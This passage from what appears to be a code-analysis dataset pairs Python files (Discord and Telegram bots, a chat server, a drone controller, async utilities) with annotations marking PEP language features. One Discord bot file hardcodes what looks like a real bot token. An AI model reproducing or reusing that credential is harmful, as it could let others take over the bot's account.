                        "async for part_index, (tensor_part, part_compression) in aenumerate(\n            amap_in_executor(\n                lambda msg: (deserialize_torch_tensor(msg.tensor_part), msg.tensor_part.compression),\n                stream,\n                max_prefetch=self.tensor_part_container.prefetch,\n            )\n        ):\n            averaged_part = await self.tensor_part_reducer.accumulate_part(sender_index, part_index, tensor_part)\n            serialized_delta = await loop.run_in_executor(\n                None, lambda: serialize_torch_tensor(averaged_part - tensor_part, part_compression)\n            )\n            yield averaging_pb2.AveragingData(code=averaging_pb2.AVERAGED_PART, tensor_part=serialized_delta)"
                    ],
                    [
                        100,
                        104,
                        "async for",
                        "async for part_index, msg in aenumerate(stream):\n                    if code is None:\n                        code = msg.code\n                    averaged_part_delta = await loop.run_in_executor(None, deserialize_torch_tensor, msg.tensor_part)\n                    self.tensor_part_container.register_processed_part(peer_index, part_index, averaged_part_delta)"
                    ],
                    [
                        76,
                        77,
                        "async for",
                        "async for averaged_tensor_delta in self.tensor_part_container.iterate_output_tensors():\n                    yield averaged_tensor_delta"
                    ],
                    [
                        140,
                        141,
                        "async for",
                        "async for msg in self._accumulate_parts_streaming(achain(aiter(request), stream), sender_index):\n                    yield msg"
                    ]
                ],
                "pep_498": [
                    [
                        56,
                        "        return f\"{self.__class__.__name__}({self.endpoint}, group_size={self.group_size})\""
                    ],
                    [
                        183,
                        "            logger.debug(f\"{self} - notifying peers about {averaging_pb2.MessageCode.Name(code)}\")"
                    ],
                    [
                        201,
                        "            logger.debug(f\"{self} - could not finish: allreduce is already finished: {self._future}\")"
                    ],
                    [
                        70,
                        "                logger.debug(f\"{self} - finished all-reduce early: all peers are auxiliaries ({self.modes})\")"
                    ],
                    [
                        147,
                        "            logger.debug(f\"{self} - peer {request.endpoint} sent {error_code}, allreduce cannot continue\")"
                    ],
                    [
                        189,
                        "                logger.debug(f\"{self} - cancelled\")"
                    ],
                    [
                        108,
                        "                        f\"peer {peer_endpoint} returned {averaging_pb2.MessageCode.Name(code)} \""
                    ],
                    [
                        192,
                        "                logger.debug(f\"{self} - caught {exception}\")"
                    ],
                    [
                        195,
                        "                logger.debug(f\"{self} - finished\")"
                    ],
                    [
                        148,
                        "            self.finalize(exception=AllreduceException(f\"peer {request.endpoint} sent {error_code}.\"))"
                    ]
                ]
            }
        },
        "45": {
            "file": "import discord\nfrom discord.ext import commands\nimport random\nimport asyncio\nfrom urllib.request import urlopen as uReq\nfrom bs4 import BeautifulSoup as soup\nimport youtube_dl\nimport time\nTOKEN = 'NTU1NTQ5ODQ3ODgxNzc3MTUz.D2tHxA.DY7FV9ULgEQoH2oUpsxQ69Q7wbY'\nextensions = ['rndfacts']\nclient = commands.Bot(command_prefix='.')\nclient.remove_command('help')\nclient.remove_command('play')\n@client.event\nasync def on_member_join(member):\n    join_msg = 'Welcome to the server, we hope you enjoy! To use any commands please use the prefix \".\" before the command desired. For help type \".help\"'\n    await client.send_message(member, join_msg)\n    join_serv_message = ' Just joined, Welcome!'\n    await client.send_message(discord.Object(id='555893854952226837'), member.mention + join_serv_message)\n    print('A user has joined the server')\n@client.event\nasync def on_ready():\n    await client.change_presence(game=discord.Game(name=\"In the Best Server Ever!\"))\n    print('Logged in as')\n    print(client.user.name)\n    print(client.user.id)\n    print('------')\nif __name__ == '__main__':\n    for extension in extensions:\n        try:\n            client.load_extensions(extension)\n        except Exception as error:\n            print('{} Cannot load [{}]'.format(extension, error))\n@client.command(pass_context = True)\nasync def clear(ctx, amount=100):\n    channel = ctx.message.channel\n    messages = []\n    if amount < 2:\n        await client.say('You must delete atlesast 2 messages!')\n    async for message in client.logs_from(channel, limit=int(amount)):\n        messages.append(message)\n    await client.delete_messages(messages)\n    await client.say('Messages Deleted.')\n    print('A member has used a command')\n@client.command()\nasync def help():\n    await client.say('For Help Please DM <@&555587892349632514>, for commands please use \".commands\"')\n    print('A member has used a command')\n@client.command()\nasync def flip():\n    flip_list = [\"Heads\", \"Tails\"]\n    flipped = random.choice(flip_list)\n    await client.say('You got: ' + flipped)\n    print('A member has used a command')\n@client.command(pass_context=True)\nasync def commands(ctx):\n    author = ctx.message.author\n    cmd_list = '\" .help \"     - Gives instructions for what to do if you need help\\n\" .commands \"       - Shows a list of availble commands and what their function is\\n\" .clear \"      - Used to clear the previous messages, enter a number after command for a specific amount you want deleted\\n\" .flip \"     - Chooses heads or tails at random\\n\" .bitcoin \"      - Shows the price of bitcoin at the time the command is used'\n    await client.send_message(author, cmd_list)\n    print('A member has used a command')\nplayers = {}\nqueues = {}\ndef check_queue(id):\n    if queues[id] != []:\n        player = queues[id].pop(8)\n        players[id] = player\n        player.start()\n@client.command(pass_context=True)\nasync def join(ctx):\n    channel_voice = ctx.message.author.voice.voice_channel\n    try:\n        await client.join_voice_channel(channel_voice)\n    except:\n        await client.say(\"You Must Be In a Channel for me to Join. (Try Again Once in a Channel)\")\n@client.command(pass_context=True)\nasync def leave(ctx):\n    server = ctx.message.server\n    voice_client = client.voice_client_in(server)\n    try:\n        await voice_client.disconnect()\n    except:\n        await client.say(\"I must be in a Voice channel to leave.\")\n    print(\"A member has used a command\")\n@client.command(pass_context=True)\nasync def play(ctx):\n    if \"www.youtube.com\" not in ctx.message.content:\n        await client.say(\"Your request must have a YouTube URL in it.\")\n    else:\n        try:\n            channel_voice = ctx.message.author.voice.voice_channel\n            await client.join_voice_channel(channel_voice)\n            try:\n                yt_url = ctx.message.content\n                link = yt_url.replace('.play ', '')\n                await client.say(\"Playing :white_check_mark:\")\n                url = link.strip()\n                print(url)\n                print('test')\n                server = ctx.message.server\n                voice_client = client.voice_client_in(server)\n                player = await voice_client.create_ytdl_player(url, after=lambda: check_queue(server.id))\n                players[server.id] = player\n                player.start()\n            except:\n                await client.say(\"Must be a YouTube URL\")\n        except:\n            await client.send_message(ctx.message.channel, \"You Must Be In a Channel for me to Join. (Try Again Once in a Channel)\")\n@client.command(pass_context=True)\nasync def pause(ctx):\n    try:\n        id = ctx.message.server.id\n        players[id].pause()\n        print(\"A member has paused audio\")\n        await client.say(\"Paused\")\n    except:\n        await client.say(\"There Must be audio playing for me to pause.\")\n@client.command(pass_context=True)\nasync def stop(ctx):\n    try:\n        id = ctx.message.server.id\n        players[id].stop()\n        print(\"A member has stopped audio\")\n    except:\n        await client.say(\"There Must be audio playing for me to stop.\")\n@client.command(pass_context=True)\nasync def resume(ctx):\n    try:\n        id = ctx.message.server.id\n        players[id].resume()\n        print(\"A member has resumed audio\")\n    except:\n        await client.say(\"There Must be audio paused for me to resume.\")\n@client.command(pass_context=True)\nasync def queue(ctx, url):\n    server = ctx.message.server\n    voice_client = client.voice_client_in(server)\n    player = await voice_client.create_ytdl_player(url, after=lambda: check_queue(server.id))\n    if server.id in queues:\n        queues[server.id].append(player)\n    else:\n        queues[server.id] = [player]\n    await client.say(\"Audio Queued.\")\n@client.command(pass_context=True)\nasync def ethereum(ctx):\n    author = ctx.message.author\n    site = 'https://cointelegraph.com/ethereum-price-index'\n    uClient = uReq(site)\n    pg_html = uClient.read()\n    uClient.close()\n    page_souped = soup(pg_html, \"html.parser\")\n    et_price = page_souped.find(\"div\", {\"class\": \"price-value\"})\n    et_vol = page_souped.find(\"div\", {\"class\": \"day-percent\"})\n    et_vol_text = et_vol.get_text()\n    et_price_text = et_price.get_text()\n    await client.say('The current price of Ethereum is: ' + et_price_text)\n    await client.say(\"Change From Yesterday: \" + et_vol_text)\n    print('A member has used a command')\nclient.run(TOKEN)",
            "patterns": {
                "pep_567": [
                    [
                        4,
                        4,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        40,
                        41,
                        "async for",
                        "async for message in client.logs_from(channel, limit=int(amount)):\n        messages.append(message)"
                    ]
                ],
                "pep_498v": [
                    [
                        33,
                        33,
                        ".format()"
                    ]
                ]
            }
        },
        "46": {
            "file": "import discord\nfrom configs import bot_config\nimport asyncio\nfrom modules import getter\nfrom discord.ext import commands, tasks\nimport commands as cmd\nclass offline(commands.Cog):\n    @tasks.loop(hours=24)\n    async def get_statistic(self):\n        await asyncio.sleep(5);\n        try:\n            sql1 = \"SELECT {},{} FROM {}\".format(bot_config.MYSQL_KK[\"kanal_id\"],bot_config.MYSQL_KK[\"discord_zahl\"],\n            bot_config.MYSQL_CONFIGURATION[\"mysql_kanal_konfiguration\"]);\n            data1 = getter.getData(sql1);\n            sql2 = \"SELECT {},{} FROM {}\".format(bot_config.MYSQL_MOD[\"kanal_id\"],bot_config.MYSQL_MOD[\"discord_mod\"],bot_config.MYSQL_CONFIGURATION[\"mysql_kanal_mod\"]);\n            data2 = getter.getData(sql2);\n            if data2 != []:\n                SERVER = self.client.get_guild(int(data2[0][0]));\n                if SERVER != None:\n                    SERVER_MOD = SERVER.get_channel(int(data2[0][1]));\n            for value in data1:\n                if value[1] != None:\n                    SERVER = self.client.get_guild(value[0]);\n                    if SERVER != None:\n                        CHANNEL = SERVER.get_channel(value[1]);\n                        if CHANNEL != None:\n                            async for message in CHANNEL.history(limit=20):\n                                if (message.author.bot != True and message.reactions == []) or (message.author.bot != True and message.reactions[0].emoji != bot_config.DISCORD_EMOJIS[\"positiv\"]):\n                                    if message.attachments != []:\n                                        win = discord.Embed(\n                                            title=\"\u2719 Beobachter - valdymo pultas\".format(message.author.mention),\n                                            description=\"\u2719 {} laukia {}.\".format(message.author.mention,\"dropo patvirtinimo\"),\n                                            color=discord.Color.purple(),\n                                        );\n                                        win.set_author(name=\"{} - {}\".format(message.guild.name,message.guild.id), icon_url=\n                                        bot_config.DISCORD_MODULE_IMAGES[\"gp\"]);\n                                        win.set_thumbnail(url=\"https://cdn.discordapp.com/attachments/594153281169653760/595574430948655117/gp.png\");\n                                        win.add_field(name=\"Patvirtinkite \u017eaid\u0117jus\",value=\"**{}** **Kontentas:** *{}* **-** *{}*.\".format(message.guild.name, message.author.mention, message.content),inline=True);\n                                        win.set_image(url=message.attachments[0].url);\n                                        win.set_footer(text=\"\u2719 Beobachter {} versija.\".format(bot_config.CLIENT_VERSION));\n                                        await SERVER_MOD.send(embed=win);\n                                    else:\n                                        if not message.author.bot:\n                                            win = discord.Embed(\n                                                title=\"\u2719 Beobachter - valdymo pultas\".format(message.author.mention),\n                                                description=\"\u2719 {} laukia {}.\".format(message.author.mention,\"dropo patvirtinimo\"),\n                                                color=discord.Color.purple(),\n                                            );\n                                            win.set_author(name=\"{}\".format(message.guild.name), icon_url=bot_config.DISCORD_MODULE_IMAGES[\"gp\"]);\n                                            win.set_thumbnail(url=\"https://cdn.discordapp.com/attachments/594153281169653760/595574430948655117/gp.png\");\n                                            win.add_field(name=\"Patvirtinkite \u017eaid\u0117jus\",value=\"**Kontentas:** *{}* **\u2709** *{}*.\".format(message.author.mention, message.content), inline=True);\n                                            win.add_field(name=\"Papildoma informacija\",value=\"`Kanalo pavadinimas: {}`\\n`Kanalo id: {}`\\n`\u017dinut\u0117s id: {}`\\n`\u017dinut\u0117s nuoroda:` {}\".format(message.author.guild, message.author.guild.id, message.id,message.jump_url), inline=True);\n                                            win.set_footer(text=\"\u2719 Beobachter {} versija.\".format(\n                                                bot_config.CLIENT_VERSION));\n                                            await SERVER_MOD.send(embed=win);\n                                        else:\n                                            pass;\n                                if message.author.bot != True:\n                                    await message.add_reaction(bot_config.DISCORD_EMOJIS[\"positiv\"]);\n        except Exception as error:\n            print(error);\n    @tasks.loop(hours=24)\n    async def clean(self):\n        await asyncio.sleep(5);\n        try:\n            sql1 = \"SELECT {},{},{} FROM {}\".format(bot_config.MYSQL_KK[\"kanal_id\"],bot_config.MYSQL_KK[\"discord_registration\"],\n            bot_config.MYSQL_KK[\"discord_beobachter\"],bot_config.MYSQL_CONFIGURATION[\"mysql_kanal_konfiguration\"]);\n            data1 = getter.getData(sql1);\n            for value in data1:\n                if value[1] != None:\n                    SERVER = self.client.get_guild(value[0]);\n                    if SERVER != None:\n                        REGISTRATION = SERVER.get_channel(value[1]);\n                        if REGISTRATION != None:\n                            async for message in REGISTRATION.history(limit=20):\n                                if message.author.bot != True or message.author.id != bot_config.CLIENT_ID:\n                                    await message.author.send(\"**{}** *Sveikas {}, noriu prane\u0161ti, kad tavo RSN registracija nepavyko. Prie\u017eastys: Beobachter botas buvo offline. Bandyk dar kart\u0105.*\".format(message.guild.name,message.author.name));\n                                    await message.delete();\n            for value in data1:\n                if value[2] != None:\n                    SERVER = self.client.get_guild(value[0]);\n                    if SERVER != None:\n                        BEOBACHTER = SERVER.get_channel(value[2]);\n                        if BEOBACHTER != None:\n                            async for message in BEOBACHTER.history(limit=20):\n                                if message.author.bot != True or message.author.id != bot_config.CLIENT_ID:\n                                    await message.author.send(\"**{}** *Sveikas {}, noriu prane\u0161ti, kad Beobachter botas buvo offline. D\u0117l \u0161ios prie\u017easties negal\u0117jai naudotis Beobachter komandomis. Bandyk dar kart\u0105.*\".format(message.guild.name,message.author.name));\n                                    await message.delete();\n        except Exception as error:\n            print(error);\n    def __init__(self,client):\n        self.client = client;\n        self.name = bot_config.CLIENT_NAME;\n        self.version = bot_config.CLIENT_VERSION;\n        self.get_statistic.start();\n        self.clean.start();\ndef setup(client):\n    client.add_cog(offline(client));",
            "patterns": {
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        27,
                        59,
                        "async for",
                        "async for message in CHANNEL.history(limit=20):\n                                if (message.author.bot != True and message.reactions == []) or (message.author.bot != True and message.reactions[0].emoji != bot_config.DISCORD_EMOJIS[\"positiv\"]):\n                                    if message.attachments != []:\n                                        win = discord.Embed(\n                                            title=\"\u2719 Beobachter - valdymo pultas\".format(message.author.mention),\n                                            description=\"\u2719 {} laukia {}.\".format(message.author.mention,\"dropo patvirtinimo\"),\n                                            color=discord.Color.purple(),\n                                        );\n                                        win.set_author(name=\"{} - {}\".format(message.guild.name,message.guild.id), icon_url=\n                                        bot_config.DISCORD_MODULE_IMAGES[\"gp\"]);\n                                        win.set_thumbnail(url=\"https://cdn.discordapp.com/attachments/594153281169653760/595574430948655117/gp.png\");\n                                        win.add_field(name=\"Patvirtinkite \u017eaid\u0117jus\",value=\"**{}** **Kontentas:** *{}* **-** *{}*.\".format(message.guild.name, message.author.mention, message.content),inline=True);\n                                        win.set_image(url=message.attachments[0].url);\n                                        win.set_footer(text=\"\u2719 Beobachter {} versija.\".format(bot_config.CLIENT_VERSION));\n                                        await SERVER_MOD.send(embed=win);\n                                    else:\n                                        if not message.author.bot:\n                                            win = discord.Embed(\n                                                title=\"\u2719 Beobachter - valdymo pultas\".format(message.author.mention),\n                                                description=\"\u2719 {} laukia {}.\".format(message.author.mention,\"dropo patvirtinimo\"),\n                                                color=discord.Color.purple(),\n                                            );\n                                            win.set_author(name=\"{}\".format(message.guild.name), icon_url=bot_config.DISCORD_MODULE_IMAGES[\"gp\"]);\n                                            win.set_thumbnail(url=\"https://cdn.discordapp.com/attachments/594153281169653760/595574430948655117/gp.png\");\n                                            win.add_field(name=\"Patvirtinkite \u017eaid\u0117jus\",value=\"**Kontentas:** *{}* **\u2709** *{}*.\".format(message.author.mention, message.content), inline=True);\n                                            win.add_field(name=\"Papildoma informacija\",value=\"`Kanalo pavadinimas: {}`\\n`Kanalo id: {}`\\n`\u017dinut\u0117s id: {}`\\n`\u017dinut\u0117s nuoroda:` {}\".format(message.author.guild, message.author.guild.id, message.id,message.jump_url), inline=True);\n                                            win.set_footer(text=\"\u2719 Beobachter {} versija.\".format(\n                                                bot_config.CLIENT_VERSION));\n                                            await SERVER_MOD.send(embed=win);\n                                        else:\n                                            pass;\n                                if message.author.bot != True:\n                                    await message.add_reaction(bot_config.DISCORD_EMOJIS[\"positiv\"]);"
                    ],
                    [
                        75,
                        78,
                        "async for",
                        "async for message in REGISTRATION.history(limit=20):\n                                if message.author.bot != True or message.author.id != bot_config.CLIENT_ID:\n                                    await message.author.send(\"**{}** *Sveikas {}, noriu prane\u0161ti, kad tavo RSN registracija nepavyko. Prie\u017eastys: Beobachter botas buvo offline. Bandyk dar kart\u0105.*\".format(message.guild.name,message.author.name));\n                                    await message.delete();"
                    ],
                    [
                        85,
                        88,
                        "async for",
                        "async for message in BEOBACHTER.history(limit=20):\n                                if message.author.bot != True or message.author.id != bot_config.CLIENT_ID:\n                                    await message.author.send(\"**{}** *Sveikas {}, noriu prane\u0161ti, kad Beobachter botas buvo offline. D\u0117l \u0161ios prie\u017easties negal\u0117jai naudotis Beobachter komandomis. Bandyk dar kart\u0105.*\".format(message.guild.name,message.author.name));\n                                    await message.delete();"
                    ]
                ],
                "pep_498v": [
                    [
                        12,
                        13,
                        ".format()"
                    ],
                    [
                        15,
                        15,
                        ".format()"
                    ],
                    [
                        66,
                        67,
                        ".format()"
                    ],
                    [
                        77,
                        77,
                        ".format()"
                    ],
                    [
                        87,
                        87,
                        ".format()"
                    ],
                    [
                        31,
                        31,
                        ".format()"
                    ],
                    [
                        32,
                        32,
                        ".format()"
                    ],
                    [
                        35,
                        35,
                        ".format()"
                    ],
                    [
                        38,
                        38,
                        ".format()"
                    ],
                    [
                        40,
                        40,
                        ".format()"
                    ],
                    [
                        45,
                        45,
                        ".format()"
                    ],
                    [
                        46,
                        46,
                        ".format()"
                    ],
                    [
                        49,
                        49,
                        ".format()"
                    ],
                    [
                        51,
                        51,
                        ".format()"
                    ],
                    [
                        52,
                        52,
                        ".format()"
                    ],
                    [
                        53,
                        54,
                        ".format()"
                    ]
                ]
            }
        },
        "47": {
            "file": "from __future__ import annotations\nimport asyncio\nimport inspect\nimport sys\nfrom contextvars import copy_context\nfrom functools import partial, wraps\nfrom os import PathLike\nfrom pathlib import Path\nfrom typing import (\n    Any,\n    AsyncGenerator,\n    Callable,\n    Coroutine,\n    Generator,\n    Iterable,\n    List,\n    Tuple,\n    TYPE_CHECKING,\n    Union,\n)\nfrom werkzeug.datastructures import Headers\nfrom .globals import current_app\nfrom .typing import FilePath\nif TYPE_CHECKING:\n    from .wrappers.response import Response  \ndef redirect(location: str, code: int = 302) -> \"Response\":\n    body = f\n    return current_app.response_class(body, status=code, headers={\"Location\": location})\ndef file_path_to_path(*paths: FilePath) -> Path:\n    safe_paths: List[Union[str, PathLike]] = []\n    for path in paths:\n        if isinstance(path, bytes):\n            safe_paths.append(path.decode())\n        else:\n            safe_paths.append(path)\n    return Path(*safe_paths)\ndef run_sync(func: Callable[..., Any]) -> Callable[..., Coroutine[None, None, Any]]:\n    @wraps(func)\n    async def _wrapper(*args: Any, **kwargs: Any) -> Any:\n        loop = asyncio.get_running_loop()\n        result = await loop.run_in_executor(\n            None, copy_context().run, partial(func, *args, **kwargs)\n        )\n        if inspect.isgenerator(result):\n            return run_sync_iterable(result)  \n        else:\n            return result\n    _wrapper._quart_async_wrapper = True  \n    return _wrapper\ndef run_sync_iterable(iterable: Generator[Any, None, None]) -> AsyncGenerator[Any, None]:\n    async def _gen_wrapper() -> AsyncGenerator[Any, None]:\n        def _inner() -> Any:\n            try:\n                return next(iterable)\n            except StopIteration:\n                raise StopAsyncIteration()\n        loop = asyncio.get_running_loop()\n        while True:\n            try:\n                yield await loop.run_in_executor(None, copy_context().run, _inner)\n            except StopAsyncIteration:\n                return\n    return _gen_wrapper()\ndef is_coroutine_function(func: Any) -> bool:\n    if sys.version_info >= (3, 8):\n        return asyncio.iscoroutinefunction(func)\n    else:\n        try:\n            from mock import AsyncMock\n            if isinstance(func, AsyncMock):\n                return True\n        except ImportError:\n            pass\n        while inspect.ismethod(func):\n            func = func.__func__\n        while isinstance(func, partial):\n            func = func.func\n        if not inspect.isfunction(func):\n            return False\n        result = bool(func.__code__.co_flags & inspect.CO_COROUTINE)\n        return result or getattr(func, \"_is_coroutine\", None) is asyncio.coroutines._is_coroutine\ndef encode_headers(headers: Headers) -> List[Tuple[bytes, bytes]]:\n    return [(key.lower().encode(), value.encode()) for key, value in headers.items()]\ndef decode_headers(headers: Iterable[Tuple[bytes, bytes]]) -> Headers:\n    return Headers([(key.decode(), value.decode()) for key, value in headers])",
            "patterns": {
                "pep_468": [
                    [
                        42,
                        "partial(func, *args, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        30,
                        "safe_paths: List[Union[str, PathLike]] = []"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ],
                    [
                        5,
                        5,
                        "import",
                        "from contextvars import copy_context"
                    ]
                ],
                "pep_563": [
                    [
                        1,
                        "from __future__ import annotations",
                        "import"
                    ],
                    [
                        26,
                        "def redirect(location: str, code: int = 302) -> \"Response\":",
                        "quoted annotation"
                    ]
                ],
                "pep_585": [
                    [
                        9,
                        "from typing import (",
                        "suggestion"
                    ],
                    [
                        9,
                        "from typing import (",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        30,
                        "    safe_paths: List[Union[str, PathLike]] = []",
                        "violation"
                    ],
                    [
                        82,
                        "def encode_headers(headers: Headers) -> List[Tuple[bytes, bytes]]:",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        51,
                        62,
                        "async generator",
                        "async def _gen_wrapper() -> AsyncGenerator[Any, None]:\n        def _inner() -> Any:\n            try:\n                return next(iterable)\n            except StopIteration:\n                raise StopAsyncIteration()\n        loop = asyncio.get_running_loop()\n        while True:\n            try:\n                yield await loop.run_in_executor(None, copy_context().run, _inner)\n            except StopAsyncIteration:\n                return"
                    ]
                ]
            }
        },
        "48": {
            "file": "import asyncio\nfrom collections import defaultdict\nfrom weakref import WeakValueDictionary\nimport json\nimport utils\nimport ssl\nWRITERS = WeakValueDictionary()\nROOMS = defaultdict(WeakValueDictionary)\nasync def sender(addr, writer, room, msg):\n    try:\n        await utils.send_message(\n            writer,\n            json.dumps(dict(room=room, msg=msg)).encode()\n        )\n    except (ConnectionAbortedError, ConnectionResetError):\n        if addr in WRITERS:\n            del WRITERS[addr]\n        if addr in ROOMS[room]:\n            del ROOMS[room][addr]\ndef send_to_room(from_addr, room: str, msg: str):\n    for addr, writer in ROOMS[room].items():\n        print(f'Sending message to {addr} in room {room}: {msg}')\n        asyncio.create_task(sender(addr, writer, room, msg))\nasync def client_connected_cb(reader, writer):\n    addr = writer.get_extra_info('peername')\n    print(f'New connection from {addr}')\n    WRITERS[addr] = writer\n    async for msg in utils.messages(reader):\n        print(f'Received bytes: {msg}')\n        d = json.loads(msg)\n        if d.get('action') == 'join':\n            ROOMS[d['room']][addr] = writer\n        elif d.get('action') == 'leave':\n            del ROOMS[d['room']][addr]\n        else:\n            d['from'] = addr\n            send_to_room(addr, d['room'], d['msg'])\nasync def main():\n    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n    ctx.check_hostname = False\n    ctx.load_cert_chain('chat.crt', 'chat.key')\n    server = await asyncio.start_server(\n        client_connected_cb=client_connected_cb,\n        host='localhost',\n        port='9011',\n        ssl=ctx,\n    )\n    shutdown = asyncio.Future()\n    utils.install_signal_handling(shutdown)\n    print('listening...')\n    async with server:\n        done, pending = await asyncio.wait(\n            [server.serve_forever(), shutdown],\n            return_when=asyncio.FIRST_COMPLETED\n        )\n        if shutdown.done():\n            return\nif __name__ == '__main__':\n    asyncio.run(main())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        28,
                        37,
                        "async for",
                        "async for msg in utils.messages(reader):\n        print(f'Received bytes: {msg}')\n        d = json.loads(msg)\n        if d.get('action') == 'join':\n            ROOMS[d['room']][addr] = writer\n        elif d.get('action') == 'leave':\n            del ROOMS[d['room']][addr]\n        else:\n            d['from'] = addr\n            send_to_room(addr, d['room'], d['msg'])"
                    ]
                ],
                "pep_498": [
                    [
                        26,
                        "    print(f'New connection from {addr}')"
                    ],
                    [
                        22,
                        "        print(f'Sending message to {addr} in room {room}: {msg}')"
                    ],
                    [
                        29,
                        "        print(f'Received bytes: {msg}')"
                    ]
                ]
            }
        },
        "49": {
            "file": "import aiohttp\nimport asyncio\nasync def fetch_sub_data(name):\n    async with aiohttp.ClientSession() as cs, cs.get(f'https://reddit.com/r/{name}/about/.json') as resp:\n        data = await resp.json()\n    return data\nclass Subreddits:\n    def __init__(self, reddit):\n        self.reddit = reddit\n        self.data = asyncio.create_task(fetch_sub_data(reddit))\n    @property\n    def icon_img(self):\n        return self.data['data']['icon_img']\n    async def new(self, limit=25, **kwargs):\n        async for s in self.reddit.get_listing(\"/subreddits/new\", limit, **kwargs):\n            pass",
            "patterns": {
                "pep_468": [
                    [
                        15,
                        "self.reddit.get_listing(\"/subreddits/new\", limit, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        15,
                        16,
                        "async for",
                        "async for s in self.reddit.get_listing(\"/subreddits/new\", limit, **kwargs):\n            pass"
                    ]
                ],
                "pep_498": [
                    [
                        4,
                        "    async with aiohttp.ClientSession() as cs, cs.get(f'https://reddit.com/r/{name}/about/.json') as resp:"
                    ]
                ]
            }
        },
        "50": {
            "file": "import asyncio\nimport logging\nimport mavsdk as sdk\nfrom mavsdk import System\nfrom .state import State\nfrom .early_laps import EarlyLaps\nfrom flight.utils.latlon import LatLon\nfrom flight.utils.movement_controller import MovementController\nfrom flight import config\nclass Takeoff(State):\n    async def run(self, drone: System):\n        async for gps in drone.telemetry.position():\n            config.takeoff_pos = LatLon(\n                round(gps.latitude_deg, 8), round(gps.longitude_deg, 8)\n            )\n            break\n        mover: MovementController = MovementController()\n        await self._check_arm_or_arm(drone)  \n        logging.info(\"Taking off\")\n        await drone.offboard.set_position_ned(\n            sdk.offboard.PositionNedYaw(0.0, 0.0, 0.0, 0.0)\n        )\n        await drone.offboard.set_velocity_ned(\n            sdk.offboard.VelocityNedYaw(0.0, 0.0, 0.0, 0.0)\n        )\n        await drone.offboard.set_velocity_body(\n            sdk.offboard.VelocityBodyYawspeed(0.0, 0.0, 0.0, 0.0)\n        )\n        try:\n            await drone.offboard.start()\n        except sdk.offboard.OffboardError:\n            await drone.action.land()\n            return\n        await mover.takeoff(drone)\n        return EarlyLaps(self.state_settings)  ",
            "patterns": {
                "pep_526": [
                    [
                        17,
                        "mover: MovementController = MovementController()"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        12,
                        16,
                        "async for",
                        "async for gps in drone.telemetry.position():\n            config.takeoff_pos = LatLon(\n                round(gps.latitude_deg, 8), round(gps.longitude_deg, 8)\n            )\n            break"
                    ]
                ]
            }
        },
        "51": {
            "file": "import asyncio\nimport os\nfrom async_lru import alru_cache\nfrom dotenv import load_dotenv\nfrom loguru import logger\nfrom telethon import TelegramClient\nfrom telethon.tl import functions, types\nfrom tortoise import Model, fields, Tortoise\nload_dotenv()\napi_id = int(os.getenv(\"API_ID\"))\napi_hash = os.getenv(\"API_HASH\")\nclient = TelegramClient('anon', api_id, api_hash)\n@alru_cache(maxsize=32)\nasync def get_entity(channel_name: str) -> types.Channel:\n    return await client.get_entity(channel_name)\nclass Channel(Model):\n    name = fields.TextField()\n    channel_id = fields.BigIntField(null=True)\n    last_message_id = fields.BigIntField(null=True)\n    blaklist_words = fields.TextField(default='')\n    forward_to_channel_id = fields.BigIntField(null=True)\n    def __str__(self):\n        return f'Channel: {self.name}'\n    async def fetch_id(self) -> None:\n        logger.info(\"\u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0432\u043d\u0443\u0442\u0440\u0435\u043d\u043d\u0438\u0439 id\")\n        entity = await get_entity(self.name)\n        self.channel_id = entity.id\n        await self.save()\n        logger.success(\"\u0413\u043e\u0442\u043e\u0432\u043e\")\n    async def create_reserve_channel(self):\n        logger.info(\"\u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043a\u0430\u043d\u0430\u043b \u0434\u0443\u0431\u043b\u0435\u0440\")\n        channel_title = (await get_entity(self.name)).title\n        result = await client(\n            functions.channels.CreateChannelRequest(title=f'AdBlocked {channel_title}', about=\"\")\n        )\n        new_chat_id = result.chats[0].id\n        self.forward_to_channel_id = new_chat_id\n        await self.save()\n        logger.success(\"\u0413\u043e\u0442\u043e\u0432\u043e\")\nasync def init_db():\n    await Tortoise.init(\n        db_url=\"sqlite://telegram.adblock.sqlite3\",\n        modules={'models': ['__main__']}\n    )\n    await Tortoise.generate_schemas()\nasync def fetch_forward_messages(channel: Channel) -> None:\n    last_message_id = channel.last_message_id\n    new_messages_count = 0\n    params = {\n        'entity': await get_entity(channel.name),\n        'reverse': True,\n        'offset_id': channel.last_message_id\n    }\n    async for message in client.iter_messages(**params):\n        if (\n                message.text and\n                any(bad_word in message.text for bad_word in channel.blaklist_words.split(','))\n        ):\n            logger.warning(message.text)\n            logger.success(\"\u0424\u0438\u043b\u044c\u0442\u0440 \u0441\u0440\u0430\u0431\u043e\u0442\u0430\u043b\")\n            continue\n        logger.info(f\"\u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 {message.id} \u0432 \u043a\u0430\u043d\u0430\u043b-\u0434\u0443\u0431\u043b\u0435\u0440\")\n        await message.forward_to(channel.forward_to_channel_id)\n        last_message_id = message.id\n        new_messages_count += 1\n    if new_messages_count:\n        logger.success(f\"\u0421\u043e\u0431\u0440\u0430\u043d\u043e {new_messages_count} \u043d\u043e\u0432\u044b\u0445 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439\")\n    channel.last_message_id = last_message_id\n    await channel.save()\nasync def main():\n    await client.connect()\n    while True:\n        async for channel in Channel.all():\n            logger.info(f\"\u0421\u043e\u0431\u0438\u0440\u0430\u0435\u043c \u0441 